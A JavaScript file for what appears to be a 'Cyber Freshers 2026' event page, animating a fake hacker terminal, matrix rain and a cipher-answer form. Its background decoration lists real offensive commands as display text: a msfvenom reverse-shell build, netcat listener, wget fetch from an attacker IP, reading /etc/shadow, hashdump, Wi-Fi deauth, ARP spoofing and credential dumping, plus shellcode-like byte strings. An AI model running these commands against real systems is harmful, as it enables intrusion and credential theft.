/* ═══════════════════════════════════════════════
   CYBER FRESHERS 2026 — HACKER OPS TERMINAL
   Boot sequence, matrix rain, typewriter, form
   ═══════════════════════════════════════════════ */

(function () {
  'use strict';

  // ─── Boot Sequence ──────────────────────────────
  // ─── Boot Sequence (Optimized: fast ~1.2s total or click to skip) ──
  const BOOT_LINES = [
    { text: '', delay: 30 },
    { text: '[BOOT] Initializing Cyber Ops Terminal v4.2.6', type: 'cyan', delay: 70 },
    { text: '[KERN] Loading kernel modules...                    [ OK ]', type: 'ok', delay: 60 },
    { text: '[INIT] Establishing encrypted tunnel...             [ OK ]', type: 'ok', delay: 60 },
    { text: '', delay: 30 },
    { text: '[SEC] Firewall status: ARMED', type: 'green', delay: 50 },
    { text: '[NET] Intrusion detection: ACTIVE', type: 'green', delay: 50 },
    { text: '[AUTH] Biometric scanner: STANDBY', type: 'cyan', delay: 50 },
    { text: '', delay: 30 },
    { text: '[AUTH] ████████ UNAUTHORIZED ACCESS DETECTED ████████', type: 'warn', delay: 90 },
    { text: '', delay: 30 },
    { text: '[SYS] Deploying countermeasures...                  [ OK ]', type: 'ok', delay: 60 },
    { text: '', delay: 30 },
    { text: '[CMD] Threat level elevated to CRITICAL.', type: 'green', delay: 50 },
    { text: '', delay: 30 },
    { text: '[NET] IP Address spoofed: 192.168.███.███', type: 'green', delay: 50 },
    { text: '[LOAD] Decrypting mission files...                  [ OK ]', type: 'ok', delay: 60 },
    { text: '', delay: 30 },
    { text: '[SYS] Terminal ready. Awaiting operator input.', type: 'green', delay: 60 },
    { text: '', delay: 30 },
    { text: '> ACCESS GRANTED — WELCOME, PHOENIX.', type: 'access-granted', delay: 80 },
  ];

  function runBootSequence() {
    const overlay = document.getElementById('boot-overlay');
    const container = document.getElementById('boot-lines');
    const progressBar = document.getElementById('boot-progress-bar');

    if (!overlay || !container) {
      showMainContent();
      return;
    }

    let lineIndex = 0;
    const totalLines = BOOT_LINES.length;
    let bootCompleted = false;

    function finishBoot() {
      if (bootCompleted) return;
      bootCompleted = true;
      overlay.classList.add('fade-out');
      setTimeout(() => {
        overlay.style.display = 'none';
        showIntrusionScreen();
      }, 350);
    }

    // Allow user to click anywhere or press any key to skip boot sequence
    overlay.style.cursor = 'pointer';
    overlay.addEventListener('click', finishBoot);
    function onBootKey(e) {
      if (!bootCompleted) finishBoot();
    }
    window.addEventListener('keydown', onBootKey, { once: true });

    function addLine() {
      if (bootCompleted) return;
      if (lineIndex >= totalLines) {
        setTimeout(finishBoot, 250);
        return;
      }

      const lineData = BOOT_LINES[lineIndex];
      const lineEl = document.createElement('div');
      lineEl.classList.add('boot-line');
      lineEl.style.animationDelay = '0s';

      let html = '';
      if (lineData.type === 'cyan') {
        html = `<span class="boot-cyan">${lineData.text}</span>`;
      } else if (lineData.type === 'ok') {
        html = `<span class="boot-green">${lineData.text.replace('[ OK ]', '<span class="boot-ok-tag">[ OK ]</span>')}</span>`;
      } else if (lineData.type === 'green') {
        html = `<span class="boot-green">${lineData.text}</span>`;
      } else if (lineData.type === 'warn') {
        html = `<span class="boot-warn">${lineData.text}</span>`;
      } else if (lineData.type === 'access-granted') {
        html = `<span class="boot-access-granted">${lineData.text}</span>`;
      } else {
        html = lineData.text || '&nbsp;';
      }

      lineEl.innerHTML = html;
      container.appendChild(lineEl);

      const progress = ((lineIndex + 1) / totalLines) * 100;
      if (progressBar) {
        progressBar.style.width = progress + '%';
      }

      container.scrollTop = container.scrollHeight;
      lineIndex++;
      setTimeout(addLine, lineData.delay);
    }

    addLine();
  }

  function showMainContent() {
    const mainContainer = document.getElementById('main-container');
    if (mainContainer) {
      mainContainer.classList.add('visible');
    }
  }

  // ─── Advanced Matrix Rain Background (Silky 60fps/120fps) ───
  let matrixRainRaf = null;

  function initMatrixRain() {
    const canvas = document.getElementById('matrix-bg');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');

    function resize() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    }
    resize();
    window.addEventListener('resize', resize);

    const numbers = '0123456789';
    const extras = 'アイウエオカキクケコ<>{}[]=~|/\\ABCDEF█▓▒░';
    const allChars = numbers.repeat(6) + extras;
    const fontSize = 13;
    let columns = Math.floor(canvas.width / fontSize);
    let drops = [];
    let speeds = [];
    let brightness = [];

    function initDrops() {
      columns = Math.floor(canvas.width / fontSize);
      drops = [];
      speeds = [];
      brightness = [];
      for (let i = 0; i < columns; i++) {
        drops.push(Math.random() * canvas.height / fontSize);
        speeds.push(0.35 + Math.random() * 0.75);
        brightness.push(0.04 + Math.random() * 0.12);
      }
    }
    initDrops();
    window.addEventListener('resize', initDrops);

    function draw() {
      matrixRainRaf = requestAnimationFrame(draw);

      ctx.fillStyle = 'rgba(0, 0, 0, 0.045)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      ctx.font = fontSize + 'px Share Tech Mono, monospace';

      for (let i = 0; i < drops.length; i++) {
        const char = allChars[Math.floor(Math.random() * allChars.length)];

        const isHighlight = Math.random() > 0.96;
        const isSuperBright = Math.random() > 0.995;

        if (isSuperBright) {
          ctx.fillStyle = '#ffffff';
        } else if (isHighlight) {
          ctx.fillStyle = '#80ffaa';
        } else {
          ctx.fillStyle = `rgba(0, 255, 65, ${brightness[i]})`;
        }

        ctx.fillText(char, i * fontSize, drops[i] * fontSize);

        if (drops[i] * fontSize > canvas.height && Math.random() > 0.96) {
          drops[i] = 0;
          speeds[i] = 0.35 + Math.random() * 0.75;
          brightness[i] = 0.04 + Math.random() * 0.12;
        }
        drops[i] += speeds[i];
      }
    }

    if (matrixRainRaf) cancelAnimationFrame(matrixRainRaf);
    matrixRainRaf = requestAnimationFrame(draw);
  }

  // ─── Typewriter Effect ────────────────────────
  function initTypewriter() {
    const el = document.getElementById('typewriter-text');
    if (!el) return;

    const message = 'WELCOME FRESHER YOUR FIRST MISSION BEGINS HERE';
    let index = 0;

    function type() {
      if (index < message.length) {
        el.textContent += message[index];
        index++;

        // Randomize typing speed for realism
        const baseSpeed = 35;
        const variance = Math.random() * 45;
        // Occasional pauses at spaces
        const pause = message[index - 1] === ' ' ? 80 : 0;
        setTimeout(type, baseSpeed + variance + pause);
      } else {
        el.classList.add('done');
      }
    }

    // Start after boot sequence would be done
    setTimeout(type, 400);
  }

  // ─── Fake IP Randomizer ───────────────────────
  function initFakeIP() {
    const ipEl = document.getElementById('fake-ip');
    if (!ipEl) return;

    function randomize() {
      const o3 = Math.floor(Math.random() * 255);
      const o4 = Math.floor(Math.random() * 255);
      ipEl.textContent = `192.168.${o3}.${o4}`;
    }

    // Change IP every few seconds
    randomize();
    setInterval(randomize, 3000);
  }

  // ─── Key Press Visual Indicator ───────────────
  function initKeyIndicator() {
    const indicator = document.getElementById('key-indicator');
    if (!indicator) return;

    const states = [
      'SYS_READY', 'MONITORING...', 'PACKETS_OK',
      'NO_THREAT', 'SCANNING...', 'SECURE',
      'ENCRYPTED', 'SHIELD_UP'
    ];

    let stateIdx = 0;

    document.addEventListener('keydown', () => {
      stateIdx = (stateIdx + 1) % states.length;
      indicator.textContent = states[stateIdx];
      indicator.style.opacity = '0.7';
      setTimeout(() => {
        indicator.style.opacity = '0.4';
      }, 200);
    });
  }

  // ─── Attempt Counter ──────────────────────────
  let attempts = 0;

  function incrementAttempts() {
    attempts++;
    const countEl = document.getElementById('attempt-count');
    if (countEl) {
      countEl.textContent = attempts;
    }
  }

  // ─── Form Submission ──────────────────────────
  function initForm() {
    const form = document.getElementById('cipher-form');
    const input = document.getElementById('cipher-input');
    const submitBtn = document.getElementById('submit-btn');
    const resultArea = document.getElementById('result-area');
    const resultMessage = document.getElementById('result-message');
    const terminalCard = document.querySelector('.terminal-card');

    if (!form) return;

    form.addEventListener('submit', async function (e) {
      e.preventDefault();

      const answer = input.value.trim();
      if (!answer) return;

      incrementAttempts();

      // Show loading state
      const btnText = submitBtn.querySelector('.btn-text');
      const btnLoading = submitBtn.querySelector('.btn-loading');
      btnText.style.display = 'none';
      btnLoading.style.display = 'inline';
      submitBtn.disabled = true;

      // Simulate brief "processing" delay for effect
      await new Promise(resolve => setTimeout(resolve, 800 + Math.random() * 600));

      try {
        const res = await fetch('/verify', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ answer: answer })
        });

        const data = await res.json();

        // Show result
        resultArea.style.display = 'block';
        resultArea.className = 'result ' + (data.success ? 'result--success' : 'result--error');

        if (data.success) {
          resultMessage.textContent = '█ ACCESS GRANTED — Identity verified. Redirecting to secure channel...';

          // Flash the screen green
          const flash = document.createElement('div');
          flash.className = 'access-flash';
          document.body.appendChild(flash);
          setTimeout(() => flash.remove(), 1500);

          // Redirect after the cinematic moment
          setTimeout(() => {
            window.location.href = '/success';
          }, 2500);
        } else {
          resultMessage.textContent = '✘ ACCESS DENIED — Cipher mismatch. Intrusion logged. Try again, fresher.';

          // Glitch shake the card on wrong answer
          if (terminalCard) {
            terminalCard.classList.add('glitch-shake');
            setTimeout(() => terminalCard.classList.remove('glitch-shake'), 600);
          }
        }
      } catch (err) {
        resultArea.style.display = 'block';
        resultArea.className = 'result result--error';
        resultMessage.textContent = '✘ CONNECTION LOST — Secure tunnel disrupted. Retry.';
      } finally {
        // Reset button
        btnText.style.display = 'inline';
        btnLoading.style.display = 'none';
        submitBtn.disabled = false;
      }
    });
  }

  // ─── Floating Hacker Background ───────────────
  function initHackerBackground() {
    const container = document.getElementById('hacker-bg');
    if (!container) return;

    // ── Kali Linux basic commands ──
    const kaliCommands = [
      'root@kali:~# nmap -sS -sV -O 192.168.1.0/24',
      'root@kali:~# nmap -A -T4 -p- 10.10.10.1',
      'root@kali:~# nmap --script vuln 192.168.1.105',
      'root@kali:~# airmon-ng start wlan0',
      'root@kali:~# airodump-ng wlan0mon',
      'root@kali:~# aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon',
      'root@kali:~# aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap',
      'root@kali:~# msfconsole',
      'msf6 > search type:exploit platform:linux',
      'msf6 > use exploit/multi/handler',
      'msf6 > set PAYLOAD linux/x64/meterpreter/reverse_tcp',
      'msf6 > exploit -j',
      'meterpreter > sysinfo',
      'meterpreter > hashdump',
      'meterpreter > shell',
      'root@kali:~# sqlmap -u "http://target/page?id=1" --dbs',
      'root@kali:~# sqlmap --os-shell',
      'root@kali:~# hydra -L users.txt -P pass.txt ssh://192.168.1.105',
      'root@kali:~# john --wordlist=rockyou.txt hashes.txt',
      'root@kali:~# hashcat -m 1000 -a 0 ntlm.txt rockyou.txt',
      'root@kali:~# burpsuite &',
      'root@kali:~# wireshark -i eth0 &',
      'root@kali:~# tcpdump -i eth0 -w packets.pcap',
      'root@kali:~# netdiscover -r 192.168.1.0/24',
      'root@kali:~# arpspoof -i eth0 -t 192.168.1.1 192.168.1.105',
      'root@kali:~# ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.105/',
      'root@kali:~# gobuster dir -u http://target -w /usr/share/dirb/common.txt',
      'root@kali:~# dirb http://192.168.1.105/ /usr/share/wordlists/',
      'root@kali:~# nikto -h http://192.168.1.105',
      'root@kali:~# wpscan --url http://target --enumerate u,p',
      'root@kali:~# enum4linux -a 192.168.1.105',
      'root@kali:~# smbclient -L //192.168.1.105 -N',
      'root@kali:~# crackmapexec smb 192.168.1.0/24',
      'root@kali:~# responder -I eth0 -dwPv',
      'root@kali:~# impacket-secretsdump DOMAIN/admin@192.168.1.105',
      'root@kali:~# searchsploit apache 2.4',
      'root@kali:~# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.12 -f elf > shell.elf',
      'root@kali:~# nc -lvnp 4444',
      'root@kali:~# python3 -m http.server 8080',
      'root@kali:~# wget http://10.10.14.12:8000/linpeas.sh',
      'root@kali:~# chmod +x linpeas.sh && ./linpeas.sh',
      'root@kali:~# find / -perm -4000 -type f 2>/dev/null',
      'root@kali:~# cat /etc/shadow',
      'root@kali:~# cat /etc/passwd',
      'root@kali:~# sudo -l',
      'root@kali:~# uname -a',
      'root@kali:~# id && whoami',
      'root@kali:~# ifconfig eth0',
      'root@kali:~# route -n',
      'root@kali:~# ss -tulnp',
      'root@kali:~# apt update && apt full-upgrade -y',
      'root@kali:~# apt install kali-linux-large',
      'root@kali:~# setoolkit',
      'root@kali:~# beef-xss',
      'root@kali:~# maltego',
      'root@kali:~# recon-ng',
      'root@kali:~# theharvester -d target.com -b all',
      'root@kali:~# fierce --domain target.com',
      'root@kali:~# whatweb http://target.com',
      'root@kali:~# wafw00f http://target.com',
      'root@kali:~# steghide extract -sf image.jpg',
      'root@kali:~# binwalk -e firmware.bin',
      'root@kali:~# volatility -f memory.dump imageinfo',
      'root@kali:~# autopsy &',
      'root@kali:~# ghidra &',
      'root@kali:~# radare2 ./binary',
      'root@kali:~# gdb -q ./exploit',
      '[*] Meterpreter session 1 opened',
      '[+] Exploit completed successfully',
      '[!] WARNING: Firewall detected',
      '[+] Root shell obtained!',
      '[*] Sending payload...',
      '[+] KEY FOUND! [ ████████████ ]',
    ];

    // ── Machine-understandable language ──
    const machineCode = [
      // Binary strings
      '01001000 01000101 01001100 01001100 01001111',
      '10110010 11010100 00101110 01110011 11001010',
      '01100001 01100011 01100011 01100101 01110011',
      '11111111 00000000 11001100 10101010 01010101',
      '00100000 01001011 01000001 01001100 01001001',
      '01110010 01101111 01101111 01110100 00111010',
      '10000011 11000100 00101000 01001000 10001101',
      '01001000 10001011 00000101 11111111 11111111',
      '11001010 11011110 10110001 00001111 10101011',
      '00110001 00110000 00110001 00110000 00110001',
      // Hex dumps
      '0x0000: 48 65 6C 6C 6F 20 57 6F 72 6C 64 21 0A 00 00 00',
      '0x0010: 7F 45 4C 46 02 01 01 00 00 00 00 00 00 00 00 00',
      '0x0020: 02 00 3E 00 01 00 00 00 78 00 40 00 00 00 00 00',
      '0x0030: 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00',
      '0x0040: B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00',
      '0x0050: 89 E5 83 EC 18 83 E4 F0 B8 00 00 00 00 E8 00 00',
      '0x0060: 55 48 89 E5 48 83 EC 10 48 8D 3D 00 00 00 00 E8',
      '0xFF00: DE AD BE EF CA FE BA BE 13 37 C0 DE FA CE D0 0D',
      '0xFF10: 00 00 00 00 FF FF FF FF 48 8B 05 00 00 00 00 FF',
      '0xFF20: CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC',
      // x86 Assembly
      'mov    eax, 0x1',
      'mov    ebx, 0x0',
      'int    0x80',
      'push   rbp',
      'mov    rbp, rsp',
      'sub    rsp, 0x20',
      'lea    rdi, [rip+0x2f]',
      'call   printf@plt',
      'xor    eax, eax',
      'pop    rbp',
      'ret',
      'jmp    0x08048490',
      'cmp    eax, 0xff',
      'jne    0x00401234',
      'syscall',
      'nop',
      'mov    rdi, rax',
      'mov    rsi, [rbp-0x8]',
      'call   0x00401100 <malloc@plt>',
      'test   rax, rax',
      'je     0x00401256',
      // Memory addresses
      '0x00007fff5fbff8c0 → 0x0000000100000f40',
      '0x00007fff5fbff8d0 → 0x00007fff5fbffb00',
      '$rip = 0x0000555555555169 <main+0>',
      '$rsp = 0x00007fffffffddd0',
      '$rbp = 0x00007fffffffddf0',
      'SIGSEGV at 0x41414141',
      'Stack: 0x7fffffffe000',
      'Heap:  0x555555559000',
      // Opcodes
      '\\x48\\x31\\xc0\\x48\\x89\\xc2\\x48\\x89\\xc6\\x48\\x8d\\x3d',
      '\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05',
      '\\xeb\\x3f\\x5f\\x80\\x77\\x0b\\x41\\x48\\x31\\xc0\\x04\\x02',
      '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69',
      // Raw binary streams
      '110010110100101010001101001010100110100101',
      '001011010100101001010010100101001010010101',
      '101010010100101010010101001010100101010010',
      '010010110100101010001101001010100110100101',
    ];

    function spawnKaliCommand() {
      const el = document.createElement('div');
      el.className = 'hacker-text';

      // Vary styling
      const r = Math.random();
      if (r < 0.3) el.classList.add('bright');
      else if (r < 0.5) el.classList.add('cyan');
      else if (r < 0.6) el.classList.add('red');

      // Pick 1-3 consecutive command lines
      const numLines = 1 + Math.floor(Math.random() * 3);
      const startIdx = Math.floor(Math.random() * kaliCommands.length);
      let text = '';
      for (let i = 0; i < numLines; i++) {
        text += kaliCommands[(startIdx + i) % kaliCommands.length];
        if (i < numLines - 1) text += '\n';
      }
      el.textContent = text;
      el.style.whiteSpace = 'pre';

      // Position
      const isHorizontal = Math.random() > 0.65;
      if (isHorizontal) {
        el.classList.add('horizontal');
        el.style.top = (3 + Math.random() * 90) + 'vh';
      } else {
        el.style.left = (2 + Math.random() * 92) + 'vw';
      }

      el.style.animationDuration = (18 + Math.random() * 35) + 's';
      el.style.fontSize = (0.55 + Math.random() * 0.25) + 'rem';

      container.appendChild(el);
      el.addEventListener('animationend', () => el.remove());
    }

    function spawnMachineCode() {
      const el = document.createElement('div');
      el.className = 'hacker-text machine';

      // Pick 2-6 lines for a dense block of machine code
      const numLines = 2 + Math.floor(Math.random() * 5);
      const startIdx = Math.floor(Math.random() * machineCode.length);
      let text = '';
      for (let i = 0; i < numLines; i++) {
        text += machineCode[(startIdx + i) % machineCode.length];
        if (i < numLines - 1) text += '\n';
      }
      el.textContent = text;
      el.style.whiteSpace = 'pre';

      // Position — machine code goes everywhere
      const isHorizontal = Math.random() > 0.75;
      if (isHorizontal) {
        el.classList.add('horizontal');
        el.style.top = (2 + Math.random() * 92) + 'vh';
      } else {
        el.style.left = (1 + Math.random() * 95) + 'vw';
      }

      el.style.animationDuration = (25 + Math.random() * 45) + 's';

      container.appendChild(el);
      el.addEventListener('animationend', () => el.remove());
    }

    // Spawn initial batch — dense from the start
    for (let i = 0; i < 12; i++) {
      setTimeout(() => spawnKaliCommand(), i * 500);
    }
    for (let i = 0; i < 10; i++) {
      setTimeout(() => spawnMachineCode(), i * 600 + 200);
    }

    // Keep spawning both types
    setInterval(spawnKaliCommand, 1800);
    setInterval(spawnMachineCode, 1400);
  }

  // ─── Intrusion Screen Digital Rain (GPU Optimized) ───────────
  let intrusionRainRaf = null;

  function initIntrusionRain() {
    const canvas = document.getElementById('intrusion-rain');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');

    function resize() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    }
    resize();
    window.addEventListener('resize', resize);

    const bitsChars = '01';
    const extraChars = 'ABCDEF{}[]<>';
    const allChars = bitsChars.repeat(30) + extraChars;

    const fontSize = 14;
    let columns = Math.floor(canvas.width / fontSize);
    let drops = [];
    let speeds = [];
    let alphas = [];

    function initDrops() {
      columns = Math.floor(canvas.width / fontSize);
      drops = [];
      speeds = [];
      alphas = [];
      for (let i = 0; i < columns; i++) {
        drops.push((Math.random() * canvas.height) / fontSize);
        speeds.push(0.35 + Math.random() * 0.7);
        alphas.push(0.08 + Math.random() * 0.16);
      }
    }
    initDrops();
    window.addEventListener('resize', initDrops);

    function draw() {
      intrusionRainRaf = requestAnimationFrame(draw);

      ctx.fillStyle = 'rgba(8, 0, 0, 0.08)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      ctx.font = fontSize + 'px JetBrains Mono, Share Tech Mono, monospace';

      for (let i = 0; i < drops.length; i++) {
        const char = allChars[Math.floor(Math.random() * allChars.length)];
        const isBright = Math.random() > 0.92;
        const isSuperBright = Math.random() > 0.995;
        const isRed = (i % 3 === 0);

        if (isSuperBright) {
          ctx.fillStyle = isRed ? '#ffaabb' : '#ffffff';
        } else if (isRed) {
          ctx.fillStyle = isBright ? '#ff3355' : `rgba(255, 34, 68, ${alphas[i] * 3.5})`;
        } else if (isBright) {
          ctx.fillStyle = '#80ffaa';
        } else {
          ctx.fillStyle = `rgba(0, 255, 65, ${alphas[i] * 3.5})`;
        }

        ctx.fillText(char, i * fontSize, drops[i] * fontSize);

        if (drops[i] * fontSize > canvas.height && Math.random() > 0.95) {
          drops[i] = 0;
          speeds[i] = 0.35 + Math.random() * 0.7;
          alphas[i] = 0.08 + Math.random() * 0.16;
        }
        drops[i] += speeds[i];
      }
    }

    intrusionRainRaf = requestAnimationFrame(draw);
  }

  // ─── Intrusion Hex Fragments (Lightweight) ───
  function spawnHexFragments() {
    const overlay = document.getElementById('intrusion-overlay');
    if (!overlay) return;

    const hexStrings = [
      '0xDEADBEEF', '0xCAFEBABE', '0x1337C0DE', '0xFF00FF',
      '0xBAADF00D', 'PAYLOAD_RDY', 'SHELL_SPAWN', 'ROOT_ACCESS'
    ];

    function spawn() {
      if (!overlay.classList.contains('active')) return;
      const el = document.createElement('div');
      el.className = 'intrusion-hex-fragment';
      el.textContent = hexStrings[Math.floor(Math.random() * hexStrings.length)];
      el.style.left = (5 + Math.random() * 90) + '%';
      el.style.animationDuration = (8 + Math.random() * 12) + 's';
      el.style.fontSize = (0.5 + Math.random() * 0.3) + 'rem';
      el.style.opacity = 0.04 + Math.random() * 0.05;
      overlay.appendChild(el);
      el.addEventListener('animationend', () => el.remove());
    }

    for (let i = 0; i < 4; i++) {
      setTimeout(spawn, i * 300);
    }
    const hexInterval = setInterval(spawn, 3000);
    overlay._hexInterval = hexInterval;
  }

  // ─── Intrusion Typewriter (Snappy) ───────────
  function intrusionTypewriter(elementId, text, speed, callback) {
    const el = document.getElementById(elementId);
    if (!el) { if (callback) callback(); return; }

    el.classList.add('typing');
    let index = 0;

    function type() {
      if (index < text.length) {
        el.textContent += text[index];
        index++;
        setTimeout(type, speed);
      } else {
        el.classList.remove('typing');
        el.classList.add('done');
        if (callback) callback();
      }
    }

    type();
  }

  // ─── Show Intrusion Screen (Instant & Non-blocking) ──
  function showIntrusionScreen() {
    const overlay = document.getElementById('intrusion-overlay');
    if (!overlay) {
      showMainContent();
      return;
    }

    initIntrusionRain();
    spawnHexFragments();

    overlay.classList.add('active');

    const bgImage = document.getElementById('intrusion-bg-image');
    const beginBtn = document.getElementById('intrusion-begin-btn');
    const line1 = document.getElementById('intrusion-line-1');
    const line2 = document.getElementById('intrusion-line-2');
    const line3 = document.getElementById('intrusion-line-3');

    if (bgImage) bgImage.classList.add('visible');

    let dismissed = false;

    function enterMain() {
      if (dismissed) return;
      dismissed = true;

      overlay.classList.remove('active');
      overlay.classList.add('fade-out');

      if (intrusionRainRaf) {
        cancelAnimationFrame(intrusionRainRaf);
        intrusionRainRaf = null;
      }
      if (overlay._hexInterval) {
        clearInterval(overlay._hexInterval);
      }

      sessionStorage.setItem('cyber_intrusion_done', '1');

      setTimeout(() => {
        overlay.style.display = 'none';
        showMainContent();
        initMatrixRain();
        initHackerBackground();
        initTypewriter();
      }, 300);
    }

    function instantReveal() {
      if (line1) {
        line1.textContent = '⚠️ Greetings Intruder ⚠️';
        line1.classList.remove('typing');
        line1.classList.add('done');
      }
      if (line2) {
        line2.textContent = "You crawled inside. 🩸 Let's see if you ever crawl out.";
        line2.classList.remove('typing');
        line2.classList.add('done');
      }
      if (line3) {
        line3.textContent = 'Begin... if you have some balls.';
        line3.classList.remove('typing');
        line3.classList.add('done');
      }
      if (beginBtn) {
        beginBtn.classList.add('visible');
      }
    }

    // Fast typewriter timeline: finishes in ~1 second
    setTimeout(() => {
      if (dismissed) return;
      intrusionTypewriter('intrusion-line-1', '⚠️ Greetings Intruder ⚠️', 16, () => {
        if (dismissed) return;
        setTimeout(() => {
          if (dismissed) return;
          intrusionTypewriter('intrusion-line-2', "You crawled inside. 🩸 Let's see if you ever crawl out.", 12, () => {
            if (dismissed) return;
            setTimeout(() => {
              if (dismissed) return;
              intrusionTypewriter('intrusion-line-3', 'Begin... if you have some balls.', 14, () => {
                if (dismissed) return;
                if (beginBtn) beginBtn.classList.add('visible');
              });
            }, 80);
          });
        }, 100);
      });
    }, 150);

    // Hard fallback: Button is guaranteed visible by 1.2s even if timers delay
    setTimeout(() => {
      if (!dismissed && beginBtn) beginBtn.classList.add('visible');
    }, 1200);

    // BEGIN button click handler
    if (beginBtn) {
      beginBtn.addEventListener('click', function (e) {
        e.stopPropagation();
        enterMain();
      });
    }

    // Instant Skip or Enter when clicking anywhere or pressing Enter/Space/Escape
    function handleOverlaySkip() {
      if (dismissed) return;
      if (beginBtn && beginBtn.classList.contains('visible')) {
        enterMain();
      } else {
        instantReveal();
      }
    }

    overlay.addEventListener('click', handleOverlaySkip);

    function onOverlayKey(e) {
      if (overlay.classList.contains('active') && !dismissed) {
        if (e.key === 'Enter' || e.key === ' ' || e.key === 'Escape') {
          handleOverlaySkip();
        }
      }
    }
    window.addEventListener('keydown', onOverlayKey);
  }

  // ─── Initialize ───────────────────────────────
  document.addEventListener('DOMContentLoaded', function () {
    const hasBooted = sessionStorage.getItem('cyber_booted');
    const intrusionDone = sessionStorage.getItem('cyber_intrusion_done');

    if (!hasBooted) {
      // First visit: fast boot (~1.2s) → intrusion → main
      runBootSequence();
      sessionStorage.setItem('cyber_booted', '1');
    } else if (!intrusionDone) {
      // Booted before but intrusion not dismissed: show intrusion
      const bootOverlay = document.getElementById('boot-overlay');
      if (bootOverlay) bootOverlay.style.display = 'none';
      showIntrusionScreen();
    } else {
      // Both done: skip straight to main content instantly
      const bootOverlay = document.getElementById('boot-overlay');
      if (bootOverlay) bootOverlay.style.display = 'none';
      const intrusionOverlay = document.getElementById('intrusion-overlay');
      if (intrusionOverlay) intrusionOverlay.style.display = 'none';
      showMainContent();
      initMatrixRain();
      initHackerBackground();
      initTypewriter();
    }

    initForm();
    initFakeIP();
    initKeyIndicator();
  });
})();
